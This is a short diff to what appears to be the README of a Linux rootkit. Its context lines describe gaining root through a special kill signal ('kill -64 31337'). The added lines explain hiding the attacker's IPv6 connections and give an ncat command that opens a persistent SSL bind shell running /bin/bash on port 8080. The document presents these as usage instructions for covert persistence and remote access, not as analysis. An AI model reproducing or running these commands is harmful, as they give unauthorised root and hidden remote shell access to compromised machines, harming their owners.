@@ -42,5 +42,8 @@ Gain root privileges. PID can be configured in source code
 ```
 kill -64 31337
 ```
-Also, your IPv6 address can be hidden from any tcp connection. Configurable in source code.
+Your IPv6 address can be hidden from any tcp connection. Configurable in source code. Useful for a IPv6 only connection such as ncat
+```
+/usr/bin/ncat -6 --ssl -k -l 8080 -e /bin/bash
+```
 
